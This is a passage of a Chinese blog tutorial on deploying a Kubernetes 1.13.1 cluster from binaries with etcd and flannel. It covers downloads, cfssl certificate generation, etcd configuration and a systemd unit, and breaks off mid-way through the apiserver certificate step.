                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Kubernetes1-13新特性"><a href="#Kubernetes1-13新特性" class="headerlink" title="Kubernetes1.13新特性"></a><strong>Kubernetes1.13新特性</strong></h3><ul>
<li><strong>使用kubeadm（GA）简化Kubernetes集群管理</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大多数与Kubernetes的工程师，都应该会使用kubeadm。它是管理集群生命周期的重要工具，从创建到配置再到升级; 现在kubeadm正式成为GA。kubeadm处理现有硬件上的生产集群的引导，并以最佳实践方式配置核心Kubernetes组件，以便为新节点提供安全而简单的连接流程并支持轻松升级。这个GA版本值得注意的是现在已经毕业的高级功能，特别是可插拔性和可配置性。kubeadm的范围是管理员和自动化，更高级别系统的工具箱，这个版本是朝这个方向迈出的重要一步。</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>容器存储接口（CSI）进入GA</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">容器存储接口（CSI）现在已经GA，在v1.9中作为alpha引入，在v1.10中作为beta引入。通过CSI，Kubernetes卷层变得真正可扩展。这为第三方存储提供商提供了编写与Kubernetes互操作而无需触及核心代码的插件的机会。该规范本身也达到了1.0状态。</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>CoreDNS现在是Kubernetes的默认DNS服务器</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在1.11中，我们宣布CoreDNS已达到基于DNS的服务发现的一般可用性。在1.13中，CoreDNS现在将kube-dns替换为Kubernetes的默认DNS服务器。CoreDNS是一个通用的，权威的DNS服务器，提供与Kubernetes向后兼容但可扩展的集成。CoreDNS比以前的DNS服务器具有更少的移动部件，因为它是单个可执行文件和单个进程，并通过创建自定义DNS条目来支持灵活的用例。它也用Go编写，使其具有内存安全性。</span><br></pre></td></tr></table></figure>

<h3 id="一、官方文档"><a href="#一、官方文档" class="headerlink" title="一、官方文档"></a><strong>一、官方文档</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.13.md#downloads-for-v1131</span><br><span class="line">https://kubernetes.io/docs/home/?path=users&amp;persona=app-developer&amp;level=foundational</span><br><span class="line">https://github.com/etcd-io/etcd</span><br><span class="line">https://shengbao.org/348.html</span><br><span class="line">https://github.com/coreos/flannel</span><br><span class="line">http://www.cnblogs.com/blogscc/p/10105134.html</span><br><span class="line">https://blog.csdn.net/xiegh2014/article/details/84830880</span><br><span class="line">https://blog.csdn.net/tiger435/article/details/85002337</span><br><span class="line">https://www.cnblogs.com/wjoyxt/p/9968491.html</span><br><span class="line">https://blog.csdn.net/zhaihaifei/article/details/79098564</span><br><span class="line">http://blog.51cto.com/jerrymin/1898243</span><br><span class="line">http://www.cnblogs.com/xuxinkun/p/5696031.html</span><br></pre></td></tr></table></figure>

<h3 id="文档目录"><a href="#文档目录" class="headerlink" title="文档目录"></a><strong>文档目录</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/kubernetes/kubernetes1.13.1%2Betcd3.3.10%2Bflanneld0.10%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2.md">kubernetes1.13.1+etcd3.3.10+flanneld0.10集群部署</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/kubernetes-dashboard-amd64/Kubernetes1.13.1%E9%83%A8%E7%BD%B2Kuberneted-dashboard%20v1.10.1.md">kubernetes1.13.1部署kuberneted-dashboard v1.10.1</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/coredns/kubernetes1.13.1%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2coredns.md">kubernetes1.13.1部署coredns</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/ingress-nginx/kubernetes1.13.1%E9%83%A8%E7%BD%B2ingress-nginx%E5%B9%B6%E9%85%8D%E7%BD%AEhttps%E8%BD%AC%E5%8F%91dashboard.md">kubernetes1.13.1部署ingress-nginx并配置https转发dashboard</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/metrics-server/kubernetes1.13.1%E9%83%A8%E7%BD%B2metrics-server0.3.1.md">kubernetes1.13.1部署metrics-server0.3.1</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/volumes/rbd/k8s%E9%9B%86%E7%BE%A4%E4%BD%BF%E7%94%A8ceph%20rbd%E5%9D%97%E5%AD%98%E5%82%A8.md">kubernetes1.13.1集群使用ceph rbd存储块</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/jenkins/k8s1.13.1%E9%9B%86%E7%BE%A4%E7%BB%93%E5%90%88ceph%20rbd%E9%83%A8%E7%BD%B2%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%ACjenkins.md">kubernetes1.13.1集群结合ceph rbd部署最新版本jenkins</a></li>
</ul>
<h3 id="二、下载链接"><a href="#二、下载链接" class="headerlink" title="二、下载链接"></a><strong>二、下载链接</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Client Binaries</span><br><span class="line">https://dl.k8s.io/v1.13.1/kubernetes-client-linux-amd64.tar.gz</span><br><span class="line">Server Binaries</span><br><span class="line">https://dl.k8s.io/v1.13.1/kubernetes-server-linux-amd64.tar.gz</span><br><span class="line">Node Binaries</span><br><span class="line">https://dl.k8s.io/v1.13.1/kubernetes-node-linux-amd64.tar.gz</span><br><span class="line">etcd</span><br><span class="line">https://github.com/etcd-io/etcd/releases/download/v3.3.10/etcd-v3.3.10-linux-amd64.tar.gz</span><br><span class="line">flannel</span><br><span class="line">https://github.com/coreos/flannel/releases/download/v0.10.0/flannel-v0.10.0-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="三、角色划分"><a href="#三、角色划分" class="headerlink" title="三、角色划分"></a>三、<strong>角色划分</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">k8s-master1 10.2.8.44   k8s-master  etcd、kube-apiserver、kube-controller-manager、kube-scheduler</span><br><span class="line">k8s-node1   10.2.8.65   k8s-node    etcd、kubelet、docker、kube_proxy</span><br><span class="line">k8s-node2   10.2.8.34   k8s-node    etcd、kubelet、docker、kube_proxy</span><br></pre></td></tr></table></figure>

<h3 id="四、Master部署"><a href="#四、Master部署" class="headerlink" title="四、Master部署"></a>四、<strong>Master部署</strong></h3><h5 id="4-1-下载软件"><a href="#4-1-下载软件" class="headerlink" title="4.1 下载软件"></a>4.1 下载软件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.k8s.io/v1.13.1/kubernetes-server-linux-amd64.tar.gz</span><br><span class="line">wget https://dl.k8s.io/v1.13.1/kubernetes-client-linux-amd64.tar.gz</span><br><span class="line">wget https://github.com/etcd-io/etcd/releases/download/v3.3.10/etcd-v3.3.10-linux-amd64.tar.gz</span><br><span class="line">wget https://github.com/coreos/flannel/releases/download/v0.10.0/flannel-v0.10.0-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<h5 id="4-2-cfssl安装"><a href="#4-2-cfssl安装" class="headerlink" title="4.2 cfssl安装"></a>4.2 cfssl安装</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://pkg.cfssl.org/R1.2/cfssl_linux-amd64</span><br><span class="line">wget https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64</span><br><span class="line">wget https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64</span><br><span class="line">chmod +x cfssl_linux-amd64 cfssljson_linux-amd64 cfssl-certinfo_linux-amd64</span><br><span class="line">mv cfssl_linux-amd64 /usr/local/bin/cfssl</span><br><span class="line">mv cfssljson_linux-amd64 /usr/local/bin/cfssljson</span><br><span class="line">mv cfssl-certinfo_linux-amd64 /usr/bin/cfssl-certinfo</span><br></pre></td></tr></table></figure>

<h5 id="4-3-创建etcd证书"><a href="#4-3-创建etcd证书" class="headerlink" title="4.3 创建etcd证书"></a>4.3 创建etcd证书</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /k8s/etcd/&#123;bin,cfg,ssl&#125; -p</span><br><span class="line">mkdir /k8s/kubernetes/&#123;bin,cfg,ssl&#125; -p</span><br><span class="line">cd /k8s/etcd/ssl/</span><br></pre></td></tr></table></figure>

<p>1）etcd ca配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee ca-config.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;signing&quot;: &#123;</span><br><span class="line">    &quot;default&quot;: &#123;</span><br><span class="line">      &quot;expiry&quot;: &quot;87600h&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;profiles&quot;: &#123;</span><br><span class="line">      &quot;etcd&quot;: &#123;</span><br><span class="line">         &quot;expiry&quot;: &quot;87600h&quot;,</span><br><span class="line">         &quot;usages&quot;: [</span><br><span class="line">            &quot;signing&quot;,</span><br><span class="line">            &quot;key encipherment&quot;,</span><br><span class="line">            &quot;server auth&quot;,</span><br><span class="line">            &quot;client auth&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>2）etcd ca证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee ca-csr.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;CN&quot;: &quot;etcd CA&quot;,</span><br><span class="line">    &quot;key&quot;: &#123;</span><br><span class="line">        &quot;algo&quot;: &quot;rsa&quot;,</span><br><span class="line">        &quot;size&quot;: 2048</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;names&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;C&quot;: &quot;CN&quot;,</span><br><span class="line">            &quot;L&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;ST&quot;: &quot;Beijing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>3）etcd server证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee server-csr.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;CN&quot;: &quot;etcd&quot;,</span><br><span class="line">    &quot;hosts&quot;: [</span><br><span class="line">    &quot;10.2.8.44&quot;,</span><br><span class="line">    &quot;10.2.8.65&quot;,</span><br><span class="line">    &quot;10.2.8.34&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;key&quot;: &#123;</span><br><span class="line">        &quot;algo&quot;: &quot;rsa&quot;,</span><br><span class="line">        &quot;size&quot;: 2048</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;names&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;C&quot;: &quot;CN&quot;,</span><br><span class="line">            &quot;L&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;ST&quot;: &quot;Beijing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>4）生成etcd ca证书和私钥 初始化ca</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cfssl gencert -initca ca-csr.json | cfssljson -bare ca </span><br><span class="line">[root@elasticsearch01 ssl]# ls</span><br><span class="line">ca-config.json  ca-csr.json  server-csr.json</span><br><span class="line">[root@elasticsearch01 ssl]# cfssl gencert -initca ca-csr.json | cfssljson -bare ca </span><br><span class="line">2018/12/26 16:13:54 [INFO] generating a new CA key and certificate from CSR</span><br><span class="line">2018/12/26 16:13:54 [INFO] generate received request</span><br><span class="line">2018/12/26 16:13:54 [INFO] received CSR</span><br><span class="line">2018/12/26 16:13:54 [INFO] generating key: rsa-2048</span><br><span class="line">2018/12/26 16:13:54 [INFO] encoded CSR</span><br><span class="line">2018/12/26 16:13:54 [INFO] signed certificate with serial number 144752911121073185391033754516204538929473929443</span><br><span class="line">[root@elasticsearch01 ssl]# ls</span><br><span class="line">ca-config.json  ca.csr  ca-csr.json  ca-key.pem  ca.pem  server-csr.json</span><br></pre></td></tr></table></figure>

<p>生成server证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=etcd server-csr.json | cfssljson -bare server</span><br><span class="line">[root@elasticsearch01 ssl]# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=etcd server-csr.json | cfssljson -bare server</span><br><span class="line">2018/12/26 16:18:53 [INFO] generate received request</span><br><span class="line">2018/12/26 16:18:53 [INFO] received CSR</span><br><span class="line">2018/12/26 16:18:53 [INFO] generating key: rsa-2048</span><br><span class="line">2018/12/26 16:18:54 [INFO] encoded CSR</span><br><span class="line">2018/12/26 16:18:54 [INFO] signed certificate with serial number 388122587040599986639159163167557684970159030057</span><br><span class="line">2018/12/26 16:18:54 [WARNING] This certificate lacks a &quot;hosts&quot; field. This makes it unsuitable for websites. </span><br><span class="line">For more information see the Baseline Requirements for the Issuance and Management of Publicly-Trusted Certificates, v.1.1.6, from the CA/Browser Forum (https://cabforum.org);</span><br><span class="line">specifically, section 10.2.3 (&quot;Information Requirements&quot;).</span><br><span class="line">[root@elasticsearch01 ssl]# ls</span><br><span class="line">ca-config.json  ca.csr  ca-csr.json  ca-key.pem  ca.pem  server.csr  server-csr.json  server-key.pem  server.pem</span><br></pre></td></tr></table></figure>

<h5 id="4-4-etcd安装"><a href="#4-4-etcd安装" class="headerlink" title="4.4 etcd安装"></a>4.4 etcd安装</h5><p>1）解压缩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf etcd-v3.3.10-linux-amd64.tar.gz</span><br><span class="line">cd etcd-v3.3.10-linux-amd64/</span><br><span class="line">cp etcd etcdctl /k8s/etcd/bin/</span><br></pre></td></tr></table></figure>

<p>2）配置etcd主文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/etcd/cfg/etcd.conf   </span><br><span class="line">#[Member]</span><br><span class="line">ETCD_NAME=&quot;etcd01&quot;</span><br><span class="line">ETCD_DATA_DIR=&quot;/data1/etcd&quot;</span><br><span class="line">ETCD_LISTEN_PEER_URLS=&quot;https://10.2.8.44:2380&quot;</span><br><span class="line">ETCD_LISTEN_CLIENT_URLS=&quot;https://10.2.8.44:2379&quot;</span><br><span class="line"></span><br><span class="line">#[Clustering]</span><br><span class="line">ETCD_INITIAL_ADVERTISE_PEER_URLS=&quot;https://10.2.8.44:2380&quot;</span><br><span class="line">ETCD_ADVERTISE_CLIENT_URLS=&quot;https://10.2.8.44:2379&quot;</span><br><span class="line">ETCD_INITIAL_CLUSTER=&quot;etcd01=https://10.2.8.44:2380,etcd02=https://10.2.8.65:2380,etcd03=https://10.2.8.34:2380&quot;</span><br><span class="line">ETCD_INITIAL_CLUSTER_TOKEN=&quot;etcd-cluster&quot;</span><br><span class="line">ETCD_INITIAL_CLUSTER_STATE=&quot;new&quot;</span><br><span class="line"></span><br><span class="line">#[Security]</span><br><span class="line">ETCD_CERT_FILE=&quot;/k8s/etcd/ssl/server.pem&quot;</span><br><span class="line">ETCD_KEY_FILE=&quot;/k8s/etcd/ssl/server-key.pem&quot;</span><br><span class="line">ETCD_TRUSTED_CA_FILE=&quot;/k8s/etcd/ssl/ca.pem&quot;</span><br><span class="line">ETCD_CLIENT_CERT_AUTH=&quot;true&quot;</span><br><span class="line">ETCD_PEER_CERT_FILE=&quot;/k8s/etcd/ssl/server.pem&quot;</span><br><span class="line">ETCD_PEER_KEY_FILE=&quot;/k8s/etcd/ssl/server-key.pem&quot;</span><br><span class="line">ETCD_PEER_TRUSTED_CA_FILE=&quot;/k8s/etcd/ssl/ca.pem&quot;</span><br><span class="line">ETCD_PEER_CLIENT_CERT_AUTH=&quot;true&quot;</span><br></pre></td></tr></table></figure>

<p>3）配置etcd启动文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data1/etcd</span><br><span class="line">vim /usr/lib/systemd/system/etcd.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=Etcd Server</span><br><span class="line">After=network.target</span><br><span class="line">After=network-online.target</span><br><span class="line">Wants=network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line">WorkingDirectory=/data1/etcd/</span><br><span class="line">EnvironmentFile=-/k8s/etcd/cfg/etcd.conf</span><br><span class="line"># set GOMAXPROCS to number of processors</span><br><span class="line">ExecStart=/bin/bash -c &quot;GOMAXPROCS=$(nproc) /k8s/etcd/bin/etcd --name=\&quot;$&#123;ETCD_NAME&#125;\&quot; --data-dir=\&quot;$&#123;ETCD_DATA_DIR&#125;\&quot; --listen-client-urls=\&quot;$&#123;ETCD_LISTEN_CLIENT_URLS&#125;\&quot; --listen-peer-urls=\&quot;$&#123;ETCD_LISTEN_PEER_URLS&#125;\&quot; --advertise-client-urls=\&quot;$&#123;ETCD_ADVERTISE_CLIENT_URLS&#125;\&quot; --initial-cluster-token=\&quot;$&#123;ETCD_INITIAL_CLUSTER_TOKEN&#125;\&quot; --initial-cluster=\&quot;$&#123;ETCD_INITIAL_CLUSTER&#125;\&quot; --initial-cluster-state=\&quot;$&#123;ETCD_INITIAL_CLUSTER_STATE&#125;\&quot; --cert-file=\&quot;$&#123;ETCD_CERT_FILE&#125;\&quot; --key-file=\&quot;$&#123;ETCD_KEY_FILE&#125;\&quot; --trusted-ca-file=\&quot;$&#123;ETCD_TRUSTED_CA_FILE&#125;\&quot; --client-cert-auth=\&quot;$&#123;ETCD_CLIENT_CERT_AUTH&#125;\&quot; --peer-cert-file=\&quot;$&#123;ETCD_PEER_CERT_FILE&#125;\&quot; --peer-key-file=\&quot;$&#123;ETCD_PEER_KEY_FILE&#125;\&quot; --peer-trusted-ca-file=\&quot;$&#123;ETCD_PEER_TRUSTED_CA_FILE&#125;\&quot; --peer-client-cert-auth=\&quot;$&#123;ETCD_PEER_CLIENT_CERT_AUTH&#125;\&quot;&quot;</span><br><span class="line">Restart=on-failure</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>4）启动 注意启动前etcd02、etcd03同样配置下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable etcd</span><br><span class="line">systemctl start etcd</span><br></pre></td></tr></table></figure>

<p>5）服务检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/k8s/etcd/bin/etcdctl --ca-file=/k8s/etcd/ssl/ca.pem --cert-file=/k8s/etcd/ssl/server.pem --key-file=/k8s/etcd/ssl/server-key.pem --endpoints=&quot;https://10.2.8.44:2379,https://10.2.8.65:2379,https://10.2.8.34:2379&quot; cluster-health</span><br><span class="line">member c21df2258ce015e6 is healthy: got healthy result from https://10.2.8.34:2379</span><br><span class="line">member d427109ed3caf9c3 is healthy: got healthy result from https://10.2.8.44:2379</span><br><span class="line">member ec8c40660d3c1192 is healthy: got healthy result from https://10.2.8.65:2379</span><br><span class="line">cluster is healthy</span><br></pre></td></tr></table></figure>

<h5 id="4-5-生成kubernets证书与私钥"><a href="#4-5-生成kubernets证书与私钥" class="headerlink" title="4.5 生成kubernets证书与私钥"></a>4.5 生成kubernets证书与私钥</h5><p>1）制作kubernetes ca证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd /k8s/kubernetes/ssl</span><br><span class="line">cat &lt;&lt; EOF | tee ca-config.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;signing&quot;: &#123;</span><br><span class="line">    &quot;default&quot;: &#123;</span><br><span class="line">      &quot;expiry&quot;: &quot;87600h&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;profiles&quot;: &#123;</span><br><span class="line">      &quot;kubernetes&quot;: &#123;</span><br><span class="line">         &quot;expiry&quot;: &quot;87600h&quot;,</span><br><span class="line">         &quot;usages&quot;: [</span><br><span class="line">            &quot;signing&quot;,</span><br><span class="line">            &quot;key encipherment&quot;,</span><br><span class="line">            &quot;server auth&quot;,</span><br><span class="line">            &quot;client auth&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee ca-csr.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;CN&quot;: &quot;kubernetes&quot;,</span><br><span class="line">    &quot;key&quot;: &#123;</span><br><span class="line">        &quot;algo&quot;: &quot;rsa&quot;,</span><br><span class="line">        &quot;size&quot;: 2048</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;names&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;C&quot;: &quot;CN&quot;,</span><br><span class="line">            &quot;L&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;ST&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;O&quot;: &quot;k8s&quot;,</span><br><span class="line">            &quot;OU&quot;: &quot;System&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cfssl gencert -initca ca-csr.json | cfssljson -bare ca -</span><br><span class="line">[root@elasticsearch01 ssl]# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -</span><br><span class="line">2018/12/27 09:47:08 [INFO] generating a new CA key and certificate from CSR</span><br><span class="line">2018/12/27 09:47:08 [INFO] generate received request</span><br><span class="line">2018/12/27 09:47:08 [INFO] received CSR</span><br><span class="line">2018/12/27 09:47:08 [INFO] generating key: rsa-2048</span><br><span class="line">2018/12/27 09:47:08 [INFO] encoded CSR</span><br><span class="line">2018/12/27 09:47:08 [INFO] signed certificate with serial number 156611735285008649323551446985295933852737436614</span><br><span class="line">[root@elasticsearch01 ssl]# ls</span><br><span class="line">ca-config.json  ca.csr  ca-csr.json  ca-key.pem  ca.pem</span><br></pre></td></tr></table></figure>

<p>2）制作apiserver证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee 